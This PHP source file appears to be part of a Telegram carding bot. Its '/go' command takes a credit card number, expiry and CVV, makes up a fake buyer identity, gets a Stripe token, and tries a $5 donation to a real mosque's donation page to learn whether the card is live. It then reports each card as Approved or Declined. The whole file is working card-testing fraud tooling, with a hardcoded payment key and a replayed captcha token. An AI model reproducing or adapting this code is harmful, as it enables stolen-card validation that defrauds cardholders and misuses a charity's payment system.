<?php

function chkgo($chatId, $message, $message_id) {

if (preg_match('/^(!|\/|\.)go/', $message)) {
//$lista = preg_replace('/\s+/', '', $lista);
$lista = substr($message, 4);
//$i = preg_split('/[|:| ]/', $lista);
$i = preg_split('/[|:|\/ ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);
$lista = "$cc|$mes|$ano|$cvv";

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
$card = "$cc$mes$ano$cvv";
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//



$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//Verifi//
/*
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

*/

//----------------MENSAGE DE ESPERA-------------------//
$response = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId, $response, $message_id, "HTML");  // Enviar el mensaje
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.6',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$token = $json["id"];
$ip = $json["client_ip"];
curl_close($curl);
//echo "$token\n";

//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://goodbricksapp.com/icsd.org/donate',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'g-recaptcha-response=03AFcWeA79gN-cRZCqHC86fNgGHKUYB4kIXpZwh0Asad6-9xnWuLyR598WPDh3DdhVZgKmFEgqjW4Q4wLjH4ILy_rOPovVGEKpaTqejsK3jqN2lWF6AU_UZDSvSf99D3GD8mKFPb2DDKW5O3T1voJNde8qlmA6uS7DCaNMQ9snUNXkWp-hRNpCYM3F4G9FtsNH89m4Ym1ASF9slZMhfS50axXAjeTUZqjHQ0wyqWMUFo8egBpY-i0SW8jvqYoLnzwNXIQ8MKZ2jBU5VPBez8_2z_GKvhqX_Chm-uVPDiTqneR4H83cCyvnoCHB9cnnRZbZSsRA2rDNu7mys0fxmmfskLoWhNM872ppHipa0d9Cv6wZL_7ZRqmk4IpL0SNqtAfm1-LcaVJSja0ZR5ZD4hlvqteyna-rP_ypt04EkUuAt__Nf0MjSkoDSRziZDTyiIPTUpumXTbNzOId93sJlQF9ZFmCjJOEjmJs5eri9yah7_1N4y-R538eHVPvfZJeROfFyPewhTJgJ6m-t2qgbczqOhhalXpdmy3xwSpm1b6lUe4fqAb5fLgOmPEwuMSiGXIW4cTQp2X7CLYehyrGUUA6HeRjHbxELJJZFvzTfR6nrYS5W-XWAJBRNPKw45Oo4voxRVCQfJMRb2Th030Wro62n8lqduUZ2-TcNpqmm0GxywcDRiGshF9K11kQjnY4gyNmwsBf7fdjiGgPsUWzNzIbA0IPUztJDU_FoM-aU40VVQXghlsNab8PMfnHTnAVUpRrIZ-RRwPMuyKLLot2YqmwwxYyuwdbsPAZ2HkiXL6T3ypjkNWOBfxqbkmgfLQtxRnmwRnizn0ZMTyrccA_EzB01MHiAm4qheWbSteU7pt6160Va-pvpG_KTrJUxQoMCflqNIPHfuMMBtB8GQ7ND4TVHgOqPtM6t-7MyA&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=masjid-operations-2025&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
//  CURLOPT_COOKIE => 'AWSELB=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E549B084AFBFC941618DBECF951F761AB9DF0241960432B90F895A2BFFFD4DBCE2F350BEBBA742F70A5B1CDB1D610D29AA3; AWSELBCORS=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E549B084AFBFC941618DBECF951F761AB9DF0241960432B90F895A2BFFFD4DBCE2F350BEBBA742F70A5B1CDB1D610D29AA3; __stripe_mid=27a8675f-023c-45ac-9483-16bd0a1b7b88bfab33; __stripe_sid=17eb8870-f952-48b8-b39f-f559cd90e22dde35cd',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'Accept-Language: es-US,es;q=0.6',
    'Origin: https://goodbricksapp.com',
    'Referer: https://goodbricksapp.com/icsd.org/donate',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);

$respo = '';

if (isset($json['status'])) {
    $respo = $json['status'];
} elseif (isset($json['message'])) {
    $messages = explode(';', $json['message']);
    $respo = trim($messages[0]);
} else {
    preg_match('/<p>(.*?)<\/p>/', $response, $matches);
    if (isset($matches[1])) {
        $respo = trim($matches[1]);
    } else {
        $respo = 'Service Unavailable';
    }
}

curl_close($curl);
	
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}
if ($respo == "SUCCEEDED"){
    $respo = "Charged $5";
}
// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";
unlink('cookie.txt');
//\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."

$retri = handleComando($card); //Checa cuntas veces se calo la misma ccs//

sendMessage($chatId, $respo, "HTML");  // Enviar el mensaje
	
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);  // Editar el mensaje con el resultado generado
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


 }

	 return null; // Si el mensaje no es un comando válido, devuelve null
}
?>
